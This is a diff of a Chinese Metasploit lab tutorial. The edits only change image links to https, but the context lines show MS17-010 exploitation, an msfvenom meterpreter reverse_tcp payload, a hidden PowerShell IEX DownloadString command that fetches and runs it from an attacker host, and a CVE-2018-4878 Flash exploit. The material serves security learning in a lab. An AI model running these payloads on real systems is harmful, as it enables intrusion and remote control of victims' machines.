@@ -8,7 +8,7 @@ Kali MSF（The Metasploit Framework），开源的漏洞利用和测试工具。
 
 MSF 提供 MSFconsole 接口：
 
-![](http://img.wukaipeng.com/2024/02/06-235229-gbrJi1-image-20240206235227871.png)
+![](https://img.wukaipeng.com/2024/02/06-235229-gbrJi1-image-20240206235227871.png)
 
 ## MS17-010 漏洞
 
@@ -35,7 +35,7 @@ Win7 需要满足这四个条件：
 >
 > 关闭「限制对命令管道和共享的匿名访问」：
 >
-> ![](http://img.wukaipeng.com/2024/02/08-235041-pDmfFl-image-20240208235041088.png)
+> ![](https://img.wukaipeng.com/2024/02/08-235041-pDmfFl-image-20240208235041088.png)
 >
 > 改完之后重启电脑
 
@@ -64,7 +64,7 @@ show options
 
 
 
-![](http://img.wukaipeng.com/2024/02/08-235705-lRXkJy-image-20240208235705660.png)
+![](https://img.wukaipeng.com/2024/02/08-235705-lRXkJy-image-20240208235705660.png)
 
 ```bash
 set rhosts 172.16.26.1
@@ -112,7 +112,7 @@ Windows 系统使用二进制解析。LNK 文件，当恶意二进制代码被�
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.26.129 lport=4444 -f psh-reflection > ~/magedu.ps1
 ```
 
-![](http://img.wukaipeng.com/2024/02/08-175726-y2WWfT-image-20240208175725260.png)
+![](https://img.wukaipeng.com/2024/02/08-175726-y2WWfT-image-20240208175725260.png)
 
 在 Home 目录可以看到新生成的 `magedu.ps1` 文件
 
@@ -130,7 +130,7 @@ service apache2 start
 
 启动后在目标机器上可访问该地址到 `megadu.psq` 木马文件：
 
-![](http://img.wukaipeng.com/2024/02/08-230617-vbqQTv-image-20240208230617185.png)
+![](https://img.wukaipeng.com/2024/02/08-230617-vbqQTv-image-20240208230617185.png)
 
 接着在目标机器上创建快捷方式：
 
@@ -138,7 +138,7 @@ service apache2 start
 powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.26.129/magedu.ps1');test.ps1"
 ```
 
-![](http://img.wukaipeng.com/2024/02/08-230541-drFSv2-image-20240208230541033.png)
+![](https://img.wukaipeng.com/2024/02/08-230541-drFSv2-image-20240208230541033.png)
 
 在 kali 创建反弹 shell：
 
@@ -152,11 +152,11 @@ show options
 
 在目标机器上打开快捷方式，kali 这边就能看到已经攻击成功了：
 
-![](http://img.wukaipeng.com/2024/02/08-230807-XTDY8x-image-20240208230807213.png)
+![](https://img.wukaipeng.com/2024/02/08-230807-XTDY8x-image-20240208230807213.png)
 
 输入 `screenshot` 命令，可以看到截图成功：
 
-![](http://img.wukaipeng.com/2024/02/08-232542-8cWNkk-image-20240208232542173.png)
+![](https://img.wukaipeng.com/2024/02/08-232542-8cWNkk-image-20240208232542173.png)
 
 ## Flash 漏洞 CVE-2018-4878
 
@@ -180,17 +180,17 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.26.129 lport=4445  -f p
 
 将生成代码替换到 python脚本中：
 
-![](http://img.wukaipeng.com/2024/02/13-140651-EiUoJO-image-20240213140651325.png)
+![](https://img.wukaipeng.com/2024/02/13-140651-EiUoJO-image-20240213140651325.png)
 
 
 
 执行脚本：
 
-![](http://img.wukaipeng.com/2024/02/13-140746-MF6F8s-image-20240213140746713.png)
+![](https://img.wukaipeng.com/2024/02/13-140746-MF6F8s-image-20240213140746713.png)
 
 将生成的脚本复制到  `/var/www/html` 中，并启动 apache 服务器
 
-![](http://img.wukaipeng.com/2024/02/13-141103-V53UJz-image-20240213141103378.png)
+![](https://img.wukaipeng.com/2024/02/13-141103-V53UJz-image-20240213141103378.png)
 
 ```
 service apache2 start
@@ -211,15 +211,15 @@ exploit
 
 目标机器上安装 Flash
 
-![](http://img.wukaipeng.com/2024/02/13-140452-kjifgr-image-20240213140452183.png)
+![](https://img.wukaipeng.com/2024/02/13-140452-kjifgr-image-20240213140452183.png)
 
 在目标机器上打开 `172.16.26.129/index2.html`
 
-![](http://img.wukaipeng.com/2024/02/13-140538-NZ6GrL-image-20240213140538664.png)
+![](https://img.wukaipeng.com/2024/02/13-140538-NZ6GrL-image-20240213140538664.png)
 
 利用成功：
 
-![](http://img.wukaipeng.com/2024/02/13-134936-TTJ3ak-image-20240213134935625.png)
+![](https://img.wukaipeng.com/2024/02/13-134936-TTJ3ak-image-20240213134935625.png)
 
 
 
